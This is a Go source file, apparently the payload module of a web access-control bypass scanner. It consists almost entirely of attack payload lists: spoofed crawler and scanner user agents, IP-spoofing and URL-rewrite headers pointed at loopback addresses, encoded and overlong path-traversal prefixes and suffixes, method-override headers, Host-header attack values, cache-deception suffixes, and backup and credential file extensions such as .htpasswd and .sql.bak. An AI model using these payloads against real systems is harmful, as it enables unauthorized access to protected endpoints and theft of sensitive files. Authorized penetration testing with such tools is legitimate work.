package utils

import (
	"strings"
)

var UserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Googlebot/2.1 (+http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; Bingbot/2.0)",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
	"Mozilla/5.0 (compatible; Cloudflare-Traffic-Manager/1.0)",
	"AWS Security Scanner",
}

var BypassHeaders = []string{
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Forwarded-For",
	"X-Forwarded-Host",
	"X-Host",
	"X-Client-IP",
	"X-Originating-IP",
	"X-Real-IP",
	"X-Remote-IP",
	"X-Remote-Addr",
	"X-HTTP-Host-Override",
	"Forwarded",
	"X-Custom-IP-Authorization",
	"Client-IP",
	"Wrapped-in",
	"X-Forwarded-Scheme",
	"X-Forwarded-Proto",
	"X-Frame-Options",
	"X-Forwarded-By",
	"X-Wap-Profile",
	"X-True-Client-IP",
	"True-Client-IP",
	"Cluster-Client-IP",
	"X-ProxyUser-Ip",
	"X-Forwarded-Server",
	"Base-Url",
	"Http-Url",
	"Proxy-Host",
	"Proxy-Url",
	"Real-Ip",
	"Redirect",
	"Request-Uri",
	"Uri",
	"X-Proxy-Url",
	"X-HTTP-DestinationURL",
	"X-Forwarded-Port",
	"X-Forwarded-Home",
}

var BypassIPs = []string{
	"127.0.0.1",
	"localhost",
	"0.0.0.0",
	"0",
	"127.1",
	"::1",
	"192.168.0.1",
	"10.0.0.1",
	"172.16.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"127.0.0.1:8080",
}

var HTTPMethods = []string{
	"GET",
	"POST",
	"HEAD",
	"PUT",
	"DELETE",
}

// Path Normalization Bypass Payloads
var PathNormalizationPayloads = []string{
	// Tab/Null Injection
	"%09",      // Tab
	"%00",      // Null byte
	"%00.jpg",  // Null byte with extension
	"%00.html", // Null byte with extension
	"%0d",      // Carriage return
	"%0a",      // Line feed
	"%0d%0a",   // CRLF
	"%0c",      // Form feed

	// Backslash Normalization (Windows-style)
	"\\",
	"\\..\\",
	"\\.\\",
	"..\\",
	".\\",

	// Semicolon Path Parameters (Java/Tomcat)
	";",
	";/",
	";foo=bar",
	";.js",
	";.css",
	";.json",
	";x=1/",
	";/..;/",

	// URL Fragments
	"#",
	"#/",
	"#.json",
	"?#",
	"?",
	"??",
	"?x=1",

	// Overlong UTF-8 Encoding
	"%c0%2e",       // Overlong .
	"%c0%2e%c0%2e", // Overlong ..
	"%c0%af",       // Overlong /
	"%e0%80%af",    // 3-byte overlong /
	"%f0%80%80%af", // 4-byte overlong /

	// Mixed Encoding
	"/%2e%2e/",
	"/%2e./",
	"/.%2e/",
	"/%5c../", // Backslash encoded
	"/%5c..%5c",
}

// Method Override Headers - for bypassing method restrictions
var MethodOverrideHeaders = []string{
	"X-HTTP-Method",
	"X-HTTP-Method-Override",
	"X-Method-Override",
	"X-HTTP-Method-Overwrite",
	"_method",
}

// Method Override Values - methods to try with override headers
var MethodOverrideValues = []string{
	"GET",
	"POST",
	"PUT",
	"DELETE",
	"PATCH",
	"OPTIONS",
	"HEAD",
}

// Host Header Attack Values
var HostHeaderValues = []string{
	"localhost",
	"localhost:80",
	"localhost:443",
	"127.0.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"0.0.0.0",
	"0.0.0.0:80",
	"[::1]",
	"[::1]:80",
	"127.1",
	"2130706433", // 127.0.0.1 in decimal
}

// Cache Deception Suffixes - for web cache deception attacks
var CacheDeceptionSuffixes = []string{
	"/style.css",
	"/test.js",
	"/logo.png",
	"/image.jpg",
	"/image.gif",
	"/favicon.ico",
	"/.css",
	"/.js",
	"/.png",
	"/.jpg",
	"/.gif",
	"/.ico",
	"/static/x.css",
	"/assets/x.js",
}

// Content-Type Values - for content-type manipulation
var ContentTypeValues = []string{
	"application/json",
	"application/xml",
	"text/plain",
	"text/html",
	"application/x-www-form-urlencoded",
	"multipart/form-data",
	"text/xml",
	"application/javascript",
	"text/css",
}

// Accept Header Values - for accept header manipulation
var AcceptHeaderValues = []string{
	"application/json",
	"application/xml",
	"text/html",
	"text/plain",
	"*/*",
	"application/pdf",
	"image/webp",
	"application/javascript",
	"text/css",
}

var TopPrefixes = []string{
	"/", "//", "///", "////", "/////", "//////",
	"/./", "//./", "///./", "/././", "//././", "//././/",
	"/../", "//../", "///../", "/..//", "//..//", "///..//", "/../../", "//../..//", "/../../../",
	"/..;/", "//..;/", "/../;/", "/..../",
	"/%2e/", "//%2e/", "/%2e%2e/", "/%2e%2e%2f/", "/%252e/", "/%252e%252e/", "/%252e%252e%252f/",
	"/%2f/", "//%2f/", "/%2f%2f/", "/%2f%2f%2f/", "/%252f/", "/%252f%252f/",
	"/%2e/", "/%2f/", "/%252f/", "/%252e/", "/%2e%2e;/", "/%2f%2f%2f/", "/%2e%2e%2e/",
	"/ /", "/  /", "/%20/", "/%20%20/", "/\t/", "/%09/",
	"/.;/", "/;/", "/;;/", "/;;;/", "/%3b/", "/%3b%3b/",
	"/?/", "/#/", "/%3f/", "/%23/", "/%3f%3d/", "//?=/",
	"/~/", "/_/", "/+/", "/%7e/", "/%2b/", "/%25/", "/%%/", "/%25%25/", "/%%%/",
	"/:/", "/%3a/", "/=/", "/%3d/", "/&/", "/%26/",
	"/...//", "/.../", "/./././", "/.;/", "/.;;/",
	"/  /", "/.  /", "/. /", "//   /",
	"/%00/", "/%0d/", "/%0a/", "/%09/", "/%0c/", "/%0d%0a/", "/%0d%0a%0d%0a/",
	"/%2e./", "/.%2e/", "/%2f./", "/./.", "/%2f%2e/", "/%2e%2f/", "/%2f%2e%2f/",
	"/%252f%252e/", "/%25%25/", "/%252f%252f/", "/%20%2e/",
	"/;x=/", "/%2f%2f%25/", "/%2e%2e%25/", "/%25%2e/",
	"/\\.\\.", "/\\?\\", "..;/", "../", "..://", "//..://",
	"/%2f%2e%2f%2e%2f/", "/%2f%2e%2e%2e%2f/", "/%25%25%25/",
	"/%2e%2f%2e%2f%2e/", "/%252e%252f%252e/", "/%2f%2f%2e%2e/",
	"/%2e%2e%2f%252f/", "/%3b%3b/", "/%2f%23%23/",
	"/%2f%2e%2e%2f%2e%2e/", "/%252f%252e%252e/", "/%2f%2f%2e%2f/",
	"/%2e%2f%252f/", "/%2f%2f%252f/", "/%2e%2e%2f%252e/",
	"/%25%2e%2e%2f/", "/%2f%25%2f%25/", "/%2f%2e%2f%252f/",
	"/%252f%252e%252f%252f/", "/%2f%2e%2e%2f%252e/",
	"/%2e%2e%2f%2e%2f/", "/%2f%2f%2e%2e%2f/",
	"/%252f%252f%2e%2e/", "/%2f%2f%2f%252e/",
	"/%2e%2f%2e%2e%2f/", "/%252e%252e%252f%252f/",
	"/%2f%2e%2e%2f%2e%2e%2f/", "/%2e%2e%2f%2e%2e%2f%2e/",
	"/%25%2f%2e%2f%25/", "/%2f%3b%3b%3b/", "/%2e%3b%3b/",
	"/%2f%20%20%20/", "/%2e%20%20/",
	"/%252f%252f%252f%252f%252f/", "/%2e%2e%2f%2f%2f%2f/",
}

var TopSuffixes = []string{
	"", "/", "//", "///", "////", "/////",
	"/.", "/..", "/...", "/....", "/../", "/..//", "/../../",
	".php", ".jsp", ".asp", ".aspx",
	".json", ".xml", ".txt", ".yaml", ".yml",
	".bak", ".backup", ".old",
	".php.bak", ".asp.bak", ".aspx.bak",
	".php.old", ".asp.old", ".aspx.old",
	".json.bak", ".txt.bak", ".xml.bak", ".yaml.bak", ".yml.bak",
	".bak.gz", ".backup.gz", ".sql.gz",
	".php~", ".asp~", ".aspx~", ".bak~", ".sql~", ".json~",
	".config", ".conf", ".ini", ".log",
	".config.bak", ".conf.bak", ".ini.bak",
	".htaccess", ".htpasswd", ".htaccess.bak", ".htpasswd.bak",
	".zip", ".tar", ".gz", ".7z", ".rar", ".bz2",
	".tar.gz", ".tar.bz2", ".zip.bak", ".tar.bak", ".gz.bak",
	".7z.bak", ".rar.bak", ".7z.gz", ".rar.gz",
	".sql", ".db", ".sql.bak", ".db.bak",
	".config.old", ".conf.old", ".ini.old",
	".log.bak", ".jsonl.bak",
	".yaml.old", ".yml.old", ".tar.gz.bak",
	".php.backup", ".asp.backup", ".aspx.backup", ".jsp.backup",
	".php.gz", ".asp.gz", ".aspx.gz", ".json.gz", ".xml.gz",
	".yaml.gz", ".yml.gz", ".config.gz", ".conf.gz", ".ini.gz",
	"/%20", "/%09", "/%0a", "/%0d", "/%00", "/%0c",
	"%20", "%09", "%0a", "%0d", "%00", "%0c",
	"/%0d%0a", ".%0d%0a", "%0d%0a",
	"/%25", ".%25", "%25", "/%25%25", ".%25%25",
	"/%3b", ".%3b", "%3b", "/%3b%3b", ".%3b%3b",
	"/%3f", ".%3f", "%3f", "/%3f%3d", ".%3f%3d",
	"/%23", ".%23", "%23",
	"/%2e%2e;/", ".%2e%2e;/",
	"/%3a", ".%3a", "%3a",
	"/%252e%252e", ".%252e%252e",
	"/%2e./", ".%2e./",
	"/%2f%25", ".%2f%25",
	"/%3d", ".%3d", "%3d",
	"/%26", ".%26", "%26",
	";", ";;",
	"#", "##",
	"?", "??",
	"..;/", "../", "..://", "//..://",
	"\\.\\..", "\\?\\",
	".html", ".htm",
}

// Unicode bypass payloads for path traversal
var UnicodePrefixes = []string{
	"/%c0%af/",
	"/%c0%ae/",
	"/%c0%ae%c0%ae/",
	"/%ef%bc%8f/",
	"/%e2%80%8c/",
	"/%e2%80%8d/",
	"/%c1%9c/",
	"/%c0%2f/",
	"/%e0%80%af/",
	"/%f0%80%80%af/",
	"/%c0%2e/",
	"/%c0%2e%c0%2e/",
	"/%e0%40%ae/",
	"/%c0%5c/",
	"/%c0%ae%c0%5c/",
}

// Double URL encoding payloads
var DoubleEncodedPrefixes = []string{
	"/%252e/",
	"/%252e%252e/",
	"/%252f/",
	"/%252e%252e%252f/",
	"/%25252e/",
	"/%25252e%25252e/",
	"/%255c/",
	"/%252e%255c%252e%252e/",
	"/%2525%32%65/",
	"/%252e%252e%255c/",
}

// GenerateCaseVariations generates case variations of a path
func GenerateCaseVariations(path string) []string {
	if path == "" || path == "/" {
		return []string{path}
	}

	variations := []string{}
	variations = append(variations, path)
	variations = append(variations, strings.ToUpper(path))
	variations = append(variations, strings.ToLower(path))

	if len(path) > 1 {
		variations = append(variations, strings.ToUpper(string(path[0]))+path[1:])
	}

	alt := ""
	for i, c := range path {
		if i%2 == 0 {
			alt += strings.ToUpper(string(c))
		} else {
			alt += strings.ToLower(string(c))
		}
	}
	variations = append(variations, alt)

	return variations
}
